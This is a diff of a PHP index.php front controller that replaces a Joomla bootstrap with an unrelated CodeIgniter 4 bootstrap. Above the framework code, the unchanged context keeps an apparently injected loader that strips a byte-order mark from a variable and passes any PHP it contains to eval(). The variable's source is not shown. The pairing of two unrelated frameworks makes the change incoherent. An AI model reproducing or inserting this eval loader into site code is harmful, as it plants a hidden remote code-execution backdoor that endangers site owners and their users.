@@ -48,52 +48,81 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-/**
- * @package    Joomla.Site
- *
- * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
- * @license    GNU General Public License version 2 or later; see LICENSE.txt
+/*
+ *---------------------------------------------------------------
+ * CHECK PHP VERSION
+ *---------------------------------------------------------------
  */
 
-/**
- * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
+$minPhpVersion = '8.1'; // If you update this, don't forget to update `spark`.
+if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
+    $message = sprintf(
+        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
+        $minPhpVersion,
+        PHP_VERSION
+    );
+
+    header('HTTP/1.1 503 Service Unavailable.', true, 503);
+    echo $message;
+
+    exit(1);
+}
+
+
+//set the variable to 'installed' after installation
+$app_state = "installed";
+
+// we don't want to access the main project before installation. redirect to installation page
+if ($app_state === 'pre_installation') {
+    $domain = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+
+    $domain = preg_replace('/index.php.*/', '', $domain); //remove everything after index.php
+    if (!empty($_SERVER['HTTPS'])) {
+        $domain = 'https://' . $domain;
+    } else {
+        $domain = 'http://' . $domain;
+    }
+
+    header("Location: $domain./install/index.php");
+    exit;
+}
+
+/*
+ *---------------------------------------------------------------
+ * SET THE CURRENT DIRECTORY
+ *---------------------------------------------------------------
  */
-define('JOOMLA_MINIMUM_PHP', '5.3.10');
 
-if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
-{
-	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
+// Path to the front controller (this file)
+define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
+
+// Ensure the current directory is pointing to the front controller's directory
+if (getcwd() . DIRECTORY_SEPARATOR !== FCPATH) {
+    chdir(FCPATH);
 }
 
-// Saves the start time and memory usage.
-$startTime = microtime(1);
-$startMem  = memory_get_usage();
-
-/**
- * Constant that is checked in included files to prevent direct access.
- * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
+/*
+ *---------------------------------------------------------------
+ * BOOTSTRAP THE APPLICATION
+ *---------------------------------------------------------------
+ * This process sets up the path constants, loads and registers
+ * our autoloader, along with Composer's, loads our constants
+ * and fires up an environment-specific bootstrapping.
  */
-define('_JEXEC', 1);
 
-if (file_exists(__DIR__ . '/defines.php'))
-{
-	include_once __DIR__ . '/defines.php';
-}
+// LOAD OUR PATHS CONFIG FILE
+// This is the line that might need to be changed, depending on your folder structure.
+require FCPATH . 'app/Config/Paths.php';
+// ^^^ Change this line if you move your application folder
 
-if (!defined('_JDEFINES'))
-{
-	define('JPATH_BASE', __DIR__);
-	require_once JPATH_BASE . '/includes/defines.php';
-}
+$paths = new Config\Paths();
 
-require_once JPATH_BASE . '/includes/framework.php';
+// LOAD THE FRAMEWORK BOOTSTRAP FILE
+require $paths->systemDirectory . '/Boot.php';
 
-// Set profiler start time and memory usage and mark afterLoad in the profiler.
-JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
+exit(CodeIgniter\Boot::bootWeb($paths));
 
-// Instantiate the application.
-$app = JFactory::getApplication('site');
 
-// Execute the application.
-$app->execute();
+
+
 
